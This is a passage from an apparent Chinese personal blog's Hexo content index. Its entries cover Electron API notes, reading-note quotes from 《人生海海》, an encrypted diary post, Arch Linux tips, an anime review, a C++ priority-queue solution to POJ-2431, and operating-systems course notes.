punctuation">,</span>          process<span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> electron </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>electron</title>
      <link href="/2020/CS/electron/"/>
      <url>/2020/CS/electron/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="常用Api"><a href="#常用Api" class="headerlink" title="常用Api"></a>常用Api</h2><h3 id="FS"><a href="#FS" class="headerlink" title="FS"></a>FS</h3><pre class="line-numbers language-jsx"><code class="language-jsx">fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//读取文件内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Window-open-弹出窗口，传递消息"><a href="#Window-open-弹出窗口，传递消息" class="headerlink" title="Window.open 弹出窗口，传递消息"></a>Window.open 弹出窗口，传递消息</h3><pre class="line-numbers language-jsx"><code class="language-jsx"><span class="token comment" spellcheck="true">// Chlid</span>window<span class="token punctuation">.</span>opener<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">"Message"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//传递信息</span>win<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//关闭窗口</span><span class="token comment" spellcheck="true">// Parent</span>window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">,</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//接受数据</span>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">,</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>    <span class="token operator">...</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Webview"><a href="#Webview" class="headerlink" title="Webview"></a>Webview</h3><p>不建议使用</p><h3 id="BrowserWindow"><a href="#BrowserWindow" class="headerlink" title="BrowserWindow"></a>BrowserWindow</h3><pre class="line-numbers language-jsx"><code class="language-jsx">frame<span class="token punctuation">:</span><span class="token boolean">false</span> <span class="token comment" spellcheck="true">//取消边框</span><span class="token comment" spellcheck="true">//优雅的显示窗口,防止闪烁</span>show<span class="token punctuation">:</span><span class="token boolean">false</span>win<span class="token punctuation">.</span><span class="token function">once</span><span class="token punctuation">(</span><span class="token string">"ready-to-show"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>    win<span class="token punctuation">.</span>show<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> electron </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《人生海海》 麦家</title>
      <link href="/2020/reading-note/%E3%80%8A%E4%BA%BA%E7%94%9F%E6%B5%B7%E6%B5%B7%E3%80%8B%20%E9%BA%A6%E5%AE%B6/"/>
      <url>/2020/reading-note/%E3%80%8A%E4%BA%BA%E7%94%9F%E6%B5%B7%E6%B5%B7%E3%80%8B%20%E9%BA%A6%E5%AE%B6/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E4%BA%BA%E7%94%9F%E6%B5%B7%E6%B5%B7%E3%80%8B.jpg" alt="封面" loading="lazy"></p><a id="more"></a><h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><h3 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h3><ol><li>爷爷讲：“绰号是人脸上的疤，难看。但没绰号，像部队里的小战士，没职务，再好看也是没人看的，没斤量的。”</li></ol><h3 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h3><ol><li>我们经常这样数落太监和他老母亲，我和表哥的友谊也因此变得更加深厚牢固，好像我们有一个共同敌人，我们必须团结一起，不弃不离。</li></ol><h3 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h3><ol><li>百草不如一木，百闻不如一见。</li><li>世上没有不透风的墙，日子久了出头的椽子总要烂。</li><li>我本来是鼓足力气抱他的，反而被这个轻压垮了，哭了。</li></ol><h3 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h3><ol><li>这天夜里十四岁的我第一次尝到了失眠的滋味，是一种夜色也有重量、形状和气味的滋味，像没睡在床铺上，是睡在黑色的空气上，睡在一堆目不暇接、纷乱和狂热的思绪里。这些思绪互相仇恨，穿着黑衣围攻我，让我虽然一动不动却累得不行，好像血液的流动需要齿轮转动才能带动。</li></ol><h3 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h3><ol><li>大人很怪的，平时总教育我们要诚实，讲真话，不能撒谎，自己却经常鬼话连篇。</li></ol><h3 id="第十一章"><a href="#第十一章" class="headerlink" title="第十一章"></a>第十一章</h3><ol><li>我守着药罐子，希望把我的祈求一起熬进药里，让爷爷走出死路。</li></ol><h3 id="第十三章"><a href="#第十三章" class="headerlink" title="第十三章"></a>第十三章</h3><ol><li>人和兽之间，只隔着一团愤怒，像生死之间只隔着一层纸</li><li>什么是道德？损人利己的事可以做，损人不利己的事不能做。</li></ol><h3 id="第十五章"><a href="#第十五章" class="headerlink" title="第十五章"></a>第十五章</h3><ol><li>月光爬在墙上，久了，累了，都从墙上下来，匍匐在天井里，把灰白的地砖照得冒出冷气。我蹑手蹑脚坐在门背后，久了，也累了，真</li></ol><h3 id="第十七章"><a href="#第十七章" class="headerlink" title="第十七章"></a>第十七章</h3><ol><li>景，仿佛发生在昨天。<br>人活一世，总要经历很多事，有些事情像空气，随风飘散，不留痕迹；有些事情像水印子，留得了一时留不久；而有些事情则像木刻，刻上去了，消不失的。我觉得自己经历的一些事，像烙铁烙穿肉、伤到筋的疤，不但消不失，还会在阴雨天隐隐疼。<br>七九</li></ol><h3 id="第十八章"><a href="#第十八章" class="headerlink" title="第十八章"></a>第十八章</h3><ol><li>报纸上说的，当一个人心怀悲悯时就不会去索取，悲悯是清空欲望的删除键。</li></ol><h3 id="第十九章"><a href="#第十九章" class="headerlink" title="第十九章"></a>第十九章</h3><ol><li>她把最宝贵的青春和初恋落在朝鲜长津湖边的血土上，这片土地形同她故乡，会魂牵梦绕的，她没收不了，也归还不了。因为嵌入血肉了，只能同血肉同生同亡。<br>初恋的感觉是甜蜜的秘密，是紧张的等待、偷窥，是手不经意中相碰触电的感觉，是炮声轰轰中的害怕和祷告，是午后的阳光在风中行走，是微风吹来了稻花香，是彻夜不眠的累人旅程，是各种复杂幽秘、别出心裁的明测暗探。总之是细腻琐碎的，孤僻，怪异，情乱神迷，神神叨叨。</li><li>世上没有如果，只有后果。</li></ol><h3 id="第二十章"><a href="#第二十章" class="headerlink" title="第二十章"></a>第二十章</h3><ol><li>报纸上说的，世上只有一种英雄主义，就是在认清了生活真相后依然热爱生活。</li><li>人生海海，敢死不叫勇气，活着才需要勇气</li><li>世上只有一种英雄主义，就是在认清了生活真相后依然热爱生活。</li><li>幸福是养自己心的，不是养人家眼的。</li><li>网络让无数的人在希望中死去，在绝望中诞生。</li><li>没有完美的人生，不完美才是人生。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-6-26</title>
      <link href="/2020/diary/2020-6/%E8%80%83%E5%AE%8C%E8%AF%95%E4%BA%86/"/>
      <url>/2020/diary/2020-6/%E8%80%83%E5%AE%8C%E8%AF%95%E4%BA%86/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="ab75800b4cef852e8495b5d792217bf0113652f9bceabb19e926667cd1a33c16">e32c27e47419b87d293b9e8ce412adf8b2f12e1129906282b54d496ca6e46f59b87954bebc0aa8b9814c36d177e15bafb8199b9e32b1833d7d4133ef5638a8f92c0a1b5fa76eb469971632e097748bbe6c9b56550164a5ee56cac496937ef255099308b1b0dc8aba12cd40421e53f4db382d0d41126e21c8651353eeded544cde4f6aa888bf351aa8fc98c516f3780f2b7d3161a403373229b030f7db0af208ce1e4c1a7a694c53a7d4428b4bd9a0ff54e74858d460c3e448cf041d65a94f6d1f3c6ab66e459d750b23976d51da08c95b42c7738c0b61002e30b9bb65214def7f37b13b5b8b605026785102977369fe1db2cd6715f6dc56221a7961e932b4537290abc0c6c44ceb1f4868415fa83e334b51468f5564534e23b5db3b4949e803eade0e8053b2a79a0b59c325e5e24e2176b6c8d32e4284dda09d529b54149da5b0cd70104559726c3012ae530cf95582d365b7c1da156d7b625368ffae9c0763be874a730fa0f00dd2dfb80015b0a7f260ce6152b537cf35a90be710dd415e7ab8e08dad0b3352a6e0d664b306e711d75ffaa82de2d06dc035c86679bf86d40ec41a6d26452137d09504a56b745bbe0338687c32e9fda53177d8c3c7b4aa366f2bfcf903d5886468c79688b8d556637a6ec34881792948fdd06a6443906e4e9beda953ae21bda740251aebb47e44c54ba6ab3d59bb92000927d9660ddd83c5dacb15bbabdf699460da4632e850c7aec79874246271b872e37467fb9e3df784d044d5b6fb8f6f0153769e098a9421340a92017389c990f8d84453a194a2d2d0b2691ae032e25672d95041accac0b20291abd79211518c170f415f4f5525d67aa5106c3d0e00e38d5961e836b7b0d22f450f1b4e6eafe76d2c5d434127839c7117edb237594d2de8222bb8956a1153bace4058a29c176d814faa8ad1b7cac47fd22845ffb693716e3f32f08773e19cffac0f24901cf4c443ee51a373df0fb9701c8c5b62b583aba8282dcf1abfa05ad77f49f94a6b026461d8411aa3c0825ee46356f7195083179703b0448abe9c61b4eec7781e7a63df94cc02888bb29ef7ff10f6b631a32ecc6d8a25f5931137b81f1409afa14a085e135f74b7107de08d248b8bb7a7a61bb6ad2bbdedb818af3af57cfaf706f720b63fae99789d0ec79d16282fd1171c11a4ffe4b7079b3cc3c0fa68195c5ee2d07c4d1479f7a5dcabf7f124941e18422b970be12f86faa48cba3e7fc5404b4f0e32764717ee568b219de2bc48e2d36e2e893bb6027e957e0afc05da50f0ba13a19af283e2a491194aeb9a47dfb6be2a6272f800d0fe1c76e0527555d924d4f18f31d61a7319c983f338cefd67c031578975170b9c24bd04dfdac6201bf20c56c90f512b1ac57bf5261c8974e783bc3e6f5193c092042dc268eb80b09cd638791314b743b97c766bebe09d9285cc66c67e6de69bfb99b924c71f3f99a4be0bbffac2b4361e9aaf367cf6493ecf877bcb221fe7d39c196f3d616696820a8ad26ab1220eeba69f482ca741cfad58eab12766f8b74a9e206688f33508af7cc208c30e93435f23ffae42b816f0e3045cad23ca301a35fb6de3f28303bdee03e8a6bd502f5059140daf38b2e12cd9088fa1f9b8b2284bcb090e58a1ea7641aa2dec89499f9456b3eb31b6b72711fd43e5a611dfe08df267129c04621d170aedc676649edf8cfd6f604d515a52f6a82341c772c51e5799819b1f0259040bfa88acf1c2137b0435e9d624fdc9e3a0f76a472e430210a1f934e33a449cec1a8d7d1efb127babfded758d3d8bccaf63f097c70b04be7694da28a3631a8fe62ca7df33f64f5c2f1145824cdea0f3c904c91894949a261c71dfc9facff54c42002355722d041206c9a18690ec5a3267b8ee49fda73b65922bcede7c2fa6de81fd83e5c2907be822aae49aaa66eacbc8e3aa0d648519bad5fa0c7585cb97c1b5b37723420f442771442992ccd4b023d0c4b8f</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>css-learn-tool</title>
      <link href="/2020/CS/css-learn-tool/"/>
      <url>/2020/CS/css-learn-tool/</url>
      
        <content type="html"><![CDATA[<!--more--><h2 id="website"><a href="#website" class="headerlink" title="website"></a>website</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/background-position" target="_blank" rel="noopener">css有对应属性的动态实例</a></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>arch-linux-problem</title>
      <link href="/2020/CS/arch-linux-problem/"/>
      <url>/2020/CS/arch-linux-problem/</url>
      
        <content type="html"><![CDATA[<!--more--><h2 id="命令行-图形界面-切换"><a href="#命令行-图形界面-切换" class="headerlink" title="命令行/图形界面 切换"></a>命令行/图形界面 切换</h2><ul><li>切换命令行 <code>ctrl + alt + F3</code></li><li>切换图形界面 <code>ctrl + alt + F2</code></li></ul><h2 id="提个醒"><a href="#提个醒" class="headerlink" title="提个醒"></a>提个醒</h2><p>以后一定不要改权限<br>真的太恶心了，电脑都差点打不开了<br>暴风哭泣</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> archlinux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《辉夜大小姐想让我告白～天才们的恋爱头脑战～ 第二季》</title>
      <link href="/2020/reading-note/%E3%80%8A%E8%BE%89%E5%A4%9C%E5%A4%A7%E5%B0%8F%E5%A7%90%E6%83%B3%E8%AE%A9%E6%88%91%E5%91%8A%E7%99%BD%EF%BD%9E%E5%A4%A9%E6%89%8D%E4%BB%AC%E7%9A%84%E6%81%8B%E7%88%B1%E5%A4%B4%E8%84%91%E6%88%98%EF%BD%9E%E3%80%8B/"/>
      <url>/2020/reading-note/%E3%80%8A%E8%BE%89%E5%A4%9C%E5%A4%A7%E5%B0%8F%E5%A7%90%E6%83%B3%E8%AE%A9%E6%88%91%E5%91%8A%E7%99%BD%EF%BD%9E%E5%A4%A9%E6%89%8D%E4%BB%AC%E7%9A%84%E6%81%8B%E7%88%B1%E5%A4%B4%E8%84%91%E6%88%98%EF%BD%9E%E3%80%8B/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E8%BE%89%E5%A4%9C%E5%A4%A7%E5%B0%8F%E5%A7%90%E6%83%B3%E8%AE%A9%E6%88%91%E5%91%8A%E7%99%BD%EF%BD%9E%E5%A4%A9%E6%89%8D%E4%BB%AC%E7%9A%84%E6%81%8B%E7%88%B1%E5%A4%B4%E8%84%91%E6%88%98%EF%BD%9E%E3%80%8B.jpg" alt="封面" loading="lazy"></p><a id="more"></a><h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><p>没忍住，看了辉夜，只想说石上真男人</p><h3 id="第一次-我"><a href="#第一次-我" class="headerlink" title="第一次 [我]"></a>第一次 [我]</h3><p>第一次半夜看番看到胃疼，好心疼石上小可爱哭死我了，会长是真的帅啊，感谢学生会照亮了石上，若是继续自暴自弃也不无可能。<br>第一次紧握双拳，只想给那个渣男两拳，揍到话都说不出。emmm，有点暴力，开心就完事了。</p><h3 id="第二次-会长"><a href="#第二次-会长" class="headerlink" title="第二次 [会长]"></a>第二次 [会长]</h3><p>会长真的太温柔了，这是我第二次觉得会长帅，不过竟然是在对石上好的时候hhhhh<br>本来预测的是跟辉夜的时候呢。<br>会长实惨。第一次是带辉夜看烟花的时候hhh。<br>会长就是那种踏实做事的，别人也都知道你的好，你的优秀。<br>当光明与阴暗交织，总有人得到救赎。希望三次也能多点温暖。</p><h3 id="第三次-石上"><a href="#第三次-石上" class="headerlink" title="第三次 [石上]"></a>第三次 [石上]</h3><p>第三次喜欢上石上。第一次因为人设喜欢。第二次因为石上的嘴瓢喜欢。第三次因为石上的正义和勇敢牺牲喜欢。<br>我爱死这个小可爱了</p><p>石上确实是个小人物，他有正义感，却用了最错误的方式。可就是这敢爱敢恨，让我觉得他更加有血肉。比某些渣男好太多，指那个大友的男朋友。<br>石上也曾想过一了百了，可是小可爱太善良了。这么好的人遭遇了不公，才更让人义愤填膺。<br>可石上，他曾经也是个正义感爆棚的人啊，如果没有遭遇那样的事，没有被那样的阴影遮蔽，想必也是个不逊色于会长的人啊。<br>但是不用后悔，你可以愤怒，可以绝望，唯独不能后悔，你干的是一件正确的事，你救了那个女孩，你保护了她的笑容。<br>就像之前她保护你的那样。</p><p>石上在对大友说无路赛八嘎的时候好帅啊啊啊啊啊，帅的时候还挺心疼他的。这么多年都是自己一个人挺过来，还是不是被人指责嫌弃。辉夜给他补习的时候就再一次被流言蜚语所伤，何其幸运，遇见了学生会这一群朋友，从此世界被点亮了。真的很幸运。<br>但大友其实也没做错什么，什么都不知情，又闹这么一出。不记恨石上都不可能，不过也只是个心结而已，解开了也就平静了。<br>每个人都继续过着各自的生活，似乎没什么变化，但石上却再一次打开心结。<br>于是石上优睁开了眼。<br>从此世界里不仅仅只有学生会的三个人，还有了一群后宫（x<br>这就是我和石上的差距，人家有后宫团，俺没有。</p><h3 id="其他-渣男"><a href="#其他-渣男" class="headerlink" title="其他 [渣男]"></a>其他 [渣男]</h3><p>难道真的是渣男会被好多女孩子喜欢的概率高么？懂了懂了，但也不敢对线，狗头。</p><p>看完觉得跟泡面番一样好快啊，又得等七个世纪了呢</p>]]></content>
      
      
      <categories>
          
          <category> 观影笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 动漫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>POJ-2431-Expedition</title>
      <link href="/2020/ACM/POJ2431/"/>
      <url>/2020/ACM/POJ2431/</url>
      
        <content type="html"><![CDATA[<!--more--><h2 id="POJ-2431-Expedition"><a href="#POJ-2431-Expedition" class="headerlink" title="POJ-2431 Expedition"></a><a href="https://vjudge.net/problem/POJ-2431" target="_blank" rel="noopener">POJ-2431 Expedition</a></h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>在行驶过程中，如果出现油不足的情况，可以认为在前面已经加过油了。<br>因此，只需要从当前位置之前的油里面找到能满足覆盖从L-Tower的距离的油数就可以了<br>因此可以使用优先队列.</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;queue></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">10010</span><span class="token punctuation">;</span><span class="token keyword">struct</span> node<span class="token punctuation">{</span>    <span class="token keyword">int</span> d<span class="token punctuation">,</span> f<span class="token punctuation">;</span><span class="token punctuation">}</span> a<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">cmp</span><span class="token punctuation">(</span>node a<span class="token punctuation">,</span> node b<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> a<span class="token punctuation">.</span>d <span class="token operator">></span> b<span class="token punctuation">.</span>d<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span> l<span class="token punctuation">,</span> p<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>cin <span class="token operator">>></span> n<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            cin <span class="token operator">>></span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>d <span class="token operator">>></span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>f<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        a<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">.</span>d <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">.</span>f <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">sort</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> a <span class="token operator">+</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> cmp<span class="token punctuation">)</span><span class="token punctuation">;</span>        cin <span class="token operator">>></span> l <span class="token operator">>></span> p<span class="token punctuation">;</span>        <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        priority_queue<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> q<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n <span class="token operator">&amp;&amp;</span> flag<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">&lt;</span> l <span class="token operator">-</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>d<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> p <span class="token operator">&lt;</span> l <span class="token operator">-</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>d<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    p <span class="token operator">+</span><span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    cnt<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">&lt;</span> l <span class="token operator">-</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>d<span class="token punctuation">)</span>                flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>             <span class="token keyword">else</span>            <span class="token punctuation">{</span>                p <span class="token operator">-</span><span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">-</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>                l <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>d<span class="token punctuation">;</span>                q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>               <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            cout <span class="token operator">&lt;&lt;</span> cnt <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">else</span>            cout<span class="token operator">&lt;&lt;</span><span class="token string">"-1"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ACM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 优先队列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统-第二章-进程的描述和控制</title>
      <link href="/2020/learning/2019-2020s/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%8F%8F%E8%BF%B0%E5%92%8C%E6%8E%A7%E5%88%B6/"/>
      <url>/2020/learning/2019-2020s/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%8F%8F%E8%BF%B0%E5%92%8C%E6%8E%A7%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<!--more--><h2 id="前驱图和程序执行"><a href="#前驱图和程序执行" class="headerlink" title="前驱图和程序执行"></a>前驱图和程序执行</h2><h3 id="前驱图"><a href="#前驱图" class="headerlink" title="前驱图"></a>前驱图</h3><p>有向无循环图，\( \rightarrow \) 表示进程之前的前驱关系</p><h3 id="程序顺序执行"><a href="#程序顺序执行" class="headerlink" title="程序顺序执行"></a>程序顺序执行</h3><ol><li>程序的顺序执行</li><li>程序顺序执行时的特征<br>（1）顺序性<br>（2）封闭性（在封闭的环境下运行、独占全机资源，一旦开始执行、不受外界因素影响）<br>（3）可再现性</li></ol><h3 id="程序并发执行"><a href="#程序并发执行" class="headerlink" title="程序并发执行"></a>程序并发执行</h3><ol><li>程序的并发执行</li><li>程序并发执行时的特征<br>（1）间断性<br>（2）失去封闭性（会受其他程序的影响）<br>（3）不可再现性</li></ol><h2 id="进程的描述"><a href="#进程的描述" class="headerlink" title="进程的描述"></a>进程的描述</h2><h3 id="进程的定义和特征"><a href="#进程的定义和特征" class="headerlink" title="进程的定义和特征"></a>进程的定义和特征</h3><ol><li>进程的定义<br>（1）为了能使程序并发执行，并且可以对并发执行的程序加以描述和控制，引入了进程的概念<br>（2）利用进程控制块（PCB）描述进程的基本情况和活动过程。<br>（3）进程实体（程序段、相关的数据段、PCB）<br>（4）进程时进程实体的运行过程，是系统进行资源分配和调度的一个独立单位</li><li>进程的特征<br>（1）动态性（最基本的特征）<br>（2）并发性（重要特征）<br>（3）独立性<br>（4）异步性</li></ol><h3 id="进程的基本状态及转换"><a href="#进程的基本状态及转换" class="headerlink" title="进程的基本状态及转换"></a>进程的基本状态及转换</h3><ol><li>进程的三种基本状态<br>（1）就绪状态<br>（2）执行状态<br>（3）阻塞状态</li><li>三种基本状态的转换</li><li>创建状态和终止状态</li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-5-20</title>
      <link href="/2020/diary/2020-5/2020-5-20/"/>
      <url>/2020/diary/2020-5/2020-5-20/</url>
      
